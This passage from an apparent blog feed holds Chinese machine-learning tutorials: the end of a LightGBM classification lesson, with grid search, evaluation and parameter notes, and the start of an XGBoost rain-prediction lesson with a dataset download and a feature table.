从sklearn库中导入网格调参函数</span></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> GridSearchCV</span><br><span class="line"></span><br><span class="line"><span class="comment">## 定义参数取值范围</span></span><br><span class="line">learning_rate = [<span class="number">0.1</span>, <span class="number">0.3</span>, <span class="number">0.6</span>]</span><br><span class="line">feature_fraction = [<span class="number">0.5</span>, <span class="number">0.8</span>, <span class="number">1</span>]</span><br><span class="line">num_leaves = [<span class="number">16</span>, <span class="number">32</span>, <span class="number">64</span>]</span><br><span class="line">max_depth = [-<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">parameters = &#123; <span class="string">&#x27;learning_rate&#x27;</span>: learning_rate,</span><br><span class="line">              <span class="string">&#x27;feature_fraction&#x27;</span>:feature_fraction,</span><br><span class="line">              <span class="string">&#x27;num_leaves&#x27;</span>: num_leaves,</span><br><span class="line">              <span class="string">&#x27;max_depth&#x27;</span>: max_depth&#125;</span><br><span class="line">model = LGBMClassifier(n_estimators = <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 进行网格搜索</span></span><br><span class="line">clf = GridSearchCV(model, parameters, cv=<span class="number">3</span>, scoring=<span class="string">&#x27;accuracy&#x27;</span>,verbose=<span class="number">3</span>, n_jobs=-<span class="number">1</span>)</span><br><span class="line">clf = clf.fit(x_train, y_train)</span><br></pre></td></tr></table></figure><pre><code>Fitting 3 folds for each of 108 candidates, totalling 324 fits[LightGBM] [Warning] feature_fraction is set=1, colsample_bytree=1.0 will be ignored. Current value: feature_fraction=1</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 网格搜索后的最好参数为</span></span><br><span class="line"></span><br><span class="line">clf.best_params_</span><br></pre></td></tr></table></figure><pre><code>&#123;'feature_fraction': 1, 'learning_rate': 0.1, 'max_depth': 3, 'num_leaves': 16&#125;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 在训练集和测试集上分布利用最好的模型参数进行预测</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 定义带参数的 LightGBM模型 </span></span><br><span class="line">clf = LGBMClassifier(feature_fraction = <span class="number">1</span>,</span><br><span class="line">                    learning_rate = <span class="number">0.1</span>,</span><br><span class="line">                    max_depth= <span class="number">3</span>,</span><br><span class="line">                    num_leaves = <span class="number">16</span>)</span><br><span class="line"><span class="comment"># 在训练集上训练LightGBM模型</span></span><br><span class="line">clf.fit(x_train, y_train)</span><br><span class="line"></span><br><span class="line">train_predict = clf.predict(x_train)</span><br><span class="line">test_predict = clf.predict(x_test)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 利用accuracy（准确度）【预测正确的样本数目占总预测样本数目的比例】评估模型效果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The accuracy of the Logistic Regression is:&#x27;</span>,metrics.accuracy_score(y_train,train_predict))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The accuracy of the Logistic Regression is:&#x27;</span>,metrics.accuracy_score(y_test,test_predict))</span><br><span class="line"></span><br><span class="line"><span class="comment">## 查看混淆矩阵 (预测值和真实值的各类情况统计矩阵)</span></span><br><span class="line">confusion_matrix_result = metrics.confusion_matrix(test_predict,y_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The confusion matrix result:\n&#x27;</span>,confusion_matrix_result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用热力图对于结果进行可视化</span></span><br><span class="line">plt.figure(figsize=(<span class="number">8</span>, <span class="number">6</span>))</span><br><span class="line">sns.heatmap(confusion_matrix_result, annot=<span class="literal">True</span>, cmap=<span class="string">&#x27;Blues&#x27;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Predicted labels&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;True labels&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><pre><code>[LightGBM] [Warning] feature_fraction is set=1, colsample_bytree=1.0 will be ignored. Current value: feature_fraction=1The accuracy of the Logistic Regression is: 0.7462988738453752The accuracy of the Logistic Regression is: 0.7302631578947368The confusion matrix result: [[724 294] [239 719]]</code></pre><p><img "" class="lazyload placeholder" data-original="output_47_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><p>原本有 306 + 245 个错误，现在有 294 + 239 个错误，带来了明显的正确率提升。</p><h2 id="24-重要知识点"><a class="markdownIt-Anchor" href="#24-重要知识点">#</a> 2.4 重要知识点</h2><h3 id="241-lightgbm的重要参数"><a class="markdownIt-Anchor" href="#241-lightgbm的重要参数">#</a> 2.4.1 LightGBM 的重要参数</h3><h4 id="2411-基本参数调整"><a class="markdownIt-Anchor" href="#2411-基本参数调整">#</a> 2.4.1.1 基本参数调整</h4><ol><li><p><strong>num_leaves 参数</strong> 这是控制树模型复杂度的主要参数，一般的我们会使 num_leaves 小于（2 的 max_depth 次方），以防止过拟合。由于 LightGBM 是 leaf-wise 建树与 XGBoost 的 depth-wise 建树方法不同，num_leaves 比 depth 有更大的作用。、</p></li><li><p><strong>min_data_in_leaf</strong> 这是处理过拟合问题中一个非常重要的参数。它的值取决于训练数据的样本个树和 num_leaves 参数。将其设置的较大可以避免生成一个过深的树，但有可能导致欠拟合。实际应用中，对于大数据集，设置其为几百或几千就足够了.</p></li><li><p><strong>max_depth</strong> 树的深度，depth 的概念在 leaf-wise 树中并没有多大作用，因为并不存在一个从 leaves 到 depth 的合理映射。</p></li></ol><h4 id="2412-针对训练速度的参数调整"><a class="markdownIt-Anchor" href="#2412-针对训练速度的参数调整">#</a> 2.4.1.2 针对训练速度的参数调整</h4><ol><li>通过设置 bagging_fraction 和 bagging_freq 参数来使用 bagging 方法。</li><li>通过设置 feature_fraction 参数来使用特征的子抽样。</li><li>选择较小的 max_bin 参数。</li><li>使用 save_binary 在未来的学习过程对数据加载进行加速。</li></ol><h4 id="2413-针对准确率的参数调整"><a class="markdownIt-Anchor" href="#2413-针对准确率的参数调整">#</a> 2.4.1.3 针对准确率的参数调整</h4><ol><li>使用较大的 max_bin （学习速度可能变慢）</li><li>使用较小的 learning_rate 和较大的 num_iterations</li><li>使用较大的 num_leaves （可能导致过拟合）</li><li>使用更大的训练数据</li><li>尝试 dart 模式</li></ol><h4 id="2414-针对过拟合的参数调整"><a class="markdownIt-Anchor" href="#2414-针对过拟合的参数调整">#</a> 2.4.1.4 针对过拟合的参数调整</h4><ol><li>使用较小的 max_bin</li><li>使用较小的 num_leaves</li><li>使用 min_data_in_leaf 和 min_sum_hessian_in_leaf</li><li>通过设置 bagging_fraction 和 bagging_freq 来使用 bagging</li><li>通过设置 feature_fraction 来使用特征子抽样</li><li>使用更大的训练数据</li><li>使用 lambda_l1, lambda_l2 和 min_gain_to_split 来使用正则</li><li>尝试 max_depth 来避免生成过深的树</li></ol><h3 id="242-lightgbm原理粗略讲解"><a class="markdownIt-Anchor" href="#242-lightgbm原理粗略讲解">#</a> 2.4.2 LightGBM 原理粗略讲解</h3><p>LightGBM 底层实现了 GBDT 算法，并且添加了一系列的新特性：</p><ol><li>基于直方图算法进行优化，使数据存储更加方便、运算更快、鲁棒性强、模型更加稳定等。</li><li>提出了带深度限制的 Leaf-wise 算法，抛弃了大多数 GBDT 工具使用的按层生长 (level-wise) 的决策树生长策略，而使用了带有深度限制的按叶子生长策略，可以降低误差，得到更好的精度。</li><li>提出了单边梯度采样算法，排除大部分小梯度的样本，仅用剩下的样本计算信息增益，它是一种在减少数据量和保证精度上平衡的算法。</li><li>提出了互斥特征捆绑算法，高维度的数据往往是稀疏的，这种稀疏性启发我们设计一种无损的方法来减少特征的维度。通常被捆绑的特征都是互斥的（即特征不会同时为非零值，像 one-hot），这样两个特征捆绑起来就不会丢失信息。</li></ol><p>LightGBM 是基于 CART 树的集成模型，它的思想是串联多个决策树模型共同进行决策。</p><p>那么如何串联呢？LightGBM 采用迭代预测误差的方法串联。举个通俗的例子，我们现在需要预测一辆车价值 3000 元。我们构建决策树 1 训练后预测为 2600 元，我们发现有 400 元的误差，那么决策树 2 的训练目标为 400 元，但决策树 2 的预测结果为 350 元，还存在 50 元的误差就交给第三棵树…… 以此类推，每一颗树用来估计之前所有树的误差，最后所有树预测结果的求和就是最终预测结果！</p><p>LightGBM 的基模型是 CART 回归树，它有两个特点：（1）CART 树，是一颗二叉树。（2）回归树，最后拟合结果是连续值。</p><p>LightGBM 模型可以表示为以下形式，我们约定<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>f</mi><mi>t</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f_t(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span> 表示前 t 颗树的和，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>h</mi><mi>t</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">h_t(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span> 表示第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathnormal">t</span></span></span></span> 颗决策树，模型定义如下：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>f</mi><mi>t</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><munderover><mo>∑</mo><mrow><mi>t</mi><mo>=</mo><mn>1</mn></mrow><mi>T</mi></munderover><msub><mi>h</mi><mi>t</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f_t(x) = \sum_{t=1}^Th_t(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.0954490000000003em;vertical-align:-1.267113em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8283360000000002em;"><span style="top:-1.882887em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.267113em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span></span></p><p>由于模型递归生成，第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathnormal">t</span></span></span></span> 步的模型由第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mtext>−</mtext><mn>1</mn></mrow><annotation encoding="application/x-tex">t−1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">t</span><span class="mord">−</span><span class="mord">1</span></span></span></span> 步的模型形成，可以写成：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>f</mi><mi>t</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>f</mi><mrow><mi>t</mi><mo>−</mo><mn>1</mn></mrow></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>+</mo><msub><mi>h</mi><mi>t</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f_t(x)=f_{t-1}(x)+h_t(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span></span></p><p>每次需要加上的树<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>h</mi><mi>t</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">h_t(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span> 是之前树求和的误差：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>r</mi><mrow><mi>t</mi><mo separator="true">,</mo><mi>i</mi></mrow></msub><mo>=</mo><msub><mi>y</mi><mi>i</mi></msub><mo>−</mo><msub><mi>f</mi><mrow><mi>m</mi><mo>−</mo><mn>1</mn></mrow></msub><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">r_{t,i} = y_i - f_{m-1}(x_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p>]]></content>
      
      
      <categories>
          
          <category> 天池机器学习入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于XGBoost的分类预测</title>
      <link href="/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%A4%A9%E6%B1%A0/%E5%9F%BA%E4%BA%8EXGBoost%E7%9A%84%E5%88%86%E7%B1%BB%E9%A2%84%E6%B5%8B/"/>
      <url>/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%A4%A9%E6%B1%A0/%E5%9F%BA%E4%BA%8EXGBoost%E7%9A%84%E5%88%86%E7%B1%BB%E9%A2%84%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="1-实验室介绍"><a class="markdownIt-Anchor" href="#1-实验室介绍">#</a> 1. 实验室介绍</h1><h2 id="11-xgboost的介绍"><a class="markdownIt-Anchor" href="#11-xgboost的介绍">#</a> 1.1 XGBoost 的介绍</h2><p>XGBoost 是 2016 年由华盛顿大学陈天奇老师带领开发的一个可扩展机器学习系统。严格意义上讲 XGBoost 并不是一种模型，而是一个可供用户轻松解决分类、回归或排序问题的软件包。它内部实现了梯度提升树 (GBDT) 模型，并对模型中的算法进行了诸多优化，在取得高精度的同时又保持了极快的速度，在一段时间内成为了国内外数据挖掘、机器学习领域中的大规模杀伤性武器。</p><p>更重要的是，XGBoost 在系统优化和机器学习原理方面都进行了深入的考虑。毫不夸张的讲，XGBoost 提供的可扩展性，可移植性与准确性推动了机器学习计算限制的上限，该系统在单台机器上运行速度比当时流行解决方案快十倍以上，甚至在分布式系统中可以处理十亿级的数据。</p><p>XGBoost 的主要优点：</p><ol><li>简单易用。相对其他机器学习库，用户可以轻松使用 XGBoost 并获得相当不错的效果。</li><li>高效可扩展。在处理大规模数据集时速度快效果好，对内存等硬件资源要求不高。</li><li>鲁棒性强。相对于深度学习模型不需要精细调参便能取得接近的效果。</li><li>XGBoost 内部实现提升树模型，可以自动处理缺失值。</li></ol><p>XGBoost 的主要缺点：</p><ol><li>相对于深度学习模型无法对时空位置建模，不能很好地捕获图像、语音、文本等高维数据。</li><li>在拥有海量训练数据，并能找到合适的深度学习模型时，深度学习的精度可以遥遥领先 XGBoost。</li></ol><h2 id="12-xgboost的应用"><a class="markdownIt-Anchor" href="#12-xgboost的应用">#</a> 1.2 XGboost 的应用</h2><p>XGBoost 在机器学习与数据挖掘领域有着极为广泛的应用。据统计在 2015 年 Kaggle 平台上 29 个获奖方案中，17 只队伍使用了 XGBoost；在 2015 年 KDD-Cup 中，前十名的队伍均使用了 XGBoost，且集成其他模型比不上调节 XGBoost 的参数所带来的提升。这些实实在在的例子都表明，XGBoost 在各种问题上都可以取得非常好的效果。</p><p>同时，XGBoost 还被成功应用在工业界与学术界的各种问题中。例如商店销售额预测、高能物理事件分类、web 文本分类；用户行为预测、运动检测、广告点击率预测、恶意软件分类、灾害风险预测、在线课程退学率预测。虽然领域相关的数据分析和特性工程在这些解决方案中也发挥了重要作用，但学习者与实践者对 XGBoost 的一致选择表明了这一软件包的影响力与重要性。</p><h1 id="2-实验室手册"><a class="markdownIt-Anchor" href="#2-实验室手册">#</a> 2. 实验室手册</h1><h2 id="21-学习目标"><a class="markdownIt-Anchor" href="#21-学习目标">#</a> 2.1 学习目标</h2><ul><li>了解 XGBoost 的参数与相关知识</li><li>掌握 XGBoost 的 Python 调用并将其运用到天气数据集预测</li></ul><h2 id="22-代码流程"><a class="markdownIt-Anchor" href="#22-代码流程">#</a> 2.2 代码流程</h2><p><strong>Part1 基于天气数据集的 XGBoost 分类实践</strong></p><ul><li>Step1: 库函数导入</li><li>Step2: 数据读取 / 载入</li><li>Step3: 数据信息简单查看</li><li>Step4: 可视化描述</li><li>Step5: 对离散变量进行编码</li><li>Step6: 利用 XGBoost 进行训练与预测</li><li>Step7: 利用 XGBoost 进行特征选择</li><li>Step8: 通过调整参数获得更好的效果</li></ul><h2 id="23-算法实战"><a class="markdownIt-Anchor" href="#23-算法实战">#</a> 2.3 算法实战</h2><h3 id="231-基于天气数据集的xgboost分类实战"><a class="markdownIt-Anchor" href="#231-基于天气数据集的xgboost分类实战">#</a> 2.3.1 基于天气数据集的 XGBoost 分类实战</h3><p>在实践的最开始，我们首先需要导入一些基础的函数库包括：numpy （Python 进行科学计算的基础软件包），pandas（pandas 是一种快速，强大，灵活且易于使用的开源数据分析和处理工具），matplotlib 和 seaborn 绘图。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#导入需要用到的数据集</span></span><br><span class="line">!wget https://tianchi-media.oss-cn-beijing.aliyuncs.com/DSW/7XGBoost/train.csv</span><br></pre></td></tr></table></figure><pre><code>'wget' 不是内部或外部命令，也不是可运行的程序或批处理文件。</code></pre><p><strong>Step1: 库函数导入</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##  基础函数库</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np </span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment">## 绘图函数库</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br></pre></td></tr></table></figure><p>本次我们选择天气数据集进行方法的尝试训练，现在有一些由气象站提供的每日降雨数据，我们需要根据历史降雨数据来预测明天会下雨的概率。样例涉及到的测试集数据 test.csv 与 train.csv 的格式完全相同，但其 RainTomorrow 未给出，为预测变量。</p><p>数据的各个特征描述如下：</p><table><thead><tr><th>特征名称</th><th>意义</th><th>取值范围</th></tr></thead><tbody><tr><td>Date</td><td>日期</td><td>字符串</td></tr><tr><td>Location</td><td>气象站的地址</td><td>字符串</td></tr><tr><td>MinTemp</td><td>最低温度</td><td>实数</td></tr><tr><td>MaxTemp</td><td>最高温度</td><td>实数</td></tr><tr><td>Rainfall</td><td>降雨量</td><td>实数</td></tr><tr><td>Evaporation</td><td>蒸发量</td><td>实数</td></tr><tr><td>Sunshine</td><td>光照时间</td><td>实数</td></tr><tr><td>WindGustDir</td><td>最强的风的方向</td><td>字符串</td></tr><tr><td>WindGustSpeed</td><td>最强的风的速度</td><td>实数</td></tr><tr><td>WindDir9am</td><td>早上 9 点的风向</td><td>字符串</td></tr><tr><td>WindDir3pm</td><td>下午 3 点的风向</td><td>字符串</td></tr><tr><td>WindSpeed9am</td><td>早上 9 点的风速</td><td>实数</td></tr><tr><td>WindSpeed3pm</td><td>下午 3 